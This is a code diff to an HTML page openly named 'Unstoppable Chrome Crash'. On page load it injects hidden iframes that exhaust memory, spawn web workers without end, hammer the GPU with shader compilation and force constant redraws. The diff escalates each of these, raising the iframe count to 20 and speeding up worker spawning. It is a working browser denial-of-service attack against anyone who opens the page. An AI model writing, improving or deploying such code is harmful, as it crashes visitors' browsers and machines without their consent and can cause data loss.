@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chrome Crash - Persistent Attack</title>
+    <title>Unstoppable Chrome Crash</title>
 </head>
 <body>
-    <h1>Chrome Crash - Bypassing "Aw, Snap"</h1>
+    <h1>Chrome Crash - Persistent & Unrecoverable</h1>
     <p>The attack starts automatically.</p>
 
     <script>
@@ -17,7 +17,7 @@
                         function overloadMemory() {
                             let memArray = [];
                             function allocate() {
-                                memArray.push(new Array(1e7).fill(0)); // Allocate large memory blocks
+                                memArray.push(new Array(1e7).fill(0)); // Allocate larger memory blocks
                                 requestAnimationFrame(allocate); // Keep allocating memory non-stop
                             }
                             allocate();
@@ -30,7 +30,7 @@
                             function startWorkers() {
                                 let worker = new Worker(URL.createObjectURL(blob));
                                 worker.postMessage("Start");
-                                requestAnimationFrame(startWorkers); // Keep spawning workers
+                                setTimeout(startWorkers, 50); // Spawn new workers more frequently
                             }
                             startWorkers();
                         }
@@ -41,16 +41,24 @@
                         function crashGPU() {
                             let shaders = [];
                             function runShaders() {
-                                var shader = gl.createShader(gl.VERTEX_SHADER);
-                                gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
-                                gl.compileShader(shader);
-                                shaders.push(shader);
-                                gl.getShaderParameter(shader, gl.COMPILE_STATUS);
+                                for (let i = 0; i < 50; i++) { // Increase shader operations
+                                    var shader = gl.createShader(gl.VERTEX_SHADER);
+                                    gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
+                                    gl.compileShader(shader);
+                                    shaders.push(shader);
+                                    gl.getShaderParameter(shader, gl.COMPILE_STATUS);
+                                }
                                 requestAnimationFrame(runShaders); // Keep stressing the GPU
                             }
                             runShaders();
                         }
                         crashGPU();
+
+                        function forceRedraw() {
+                            document.body.style.backgroundColor = document.body.style.backgroundColor === 'black' ? 'white' : 'black';
+                            requestAnimationFrame(forceRedraw);
+                        }
+                        forceRedraw();
                     <\/script>
                 `);
                 document.body.appendChild(iframe);
@@ -58,8 +66,7 @@
         }
 
         // Inject multiple hidden iframes running the persistent attack
-        injectHiddenIframes(15); // Increase this for stronger execution
+        injectHiddenIframes(20); // Increased iframe count to maximize execution
     </script>
 </body>
 </html>
-
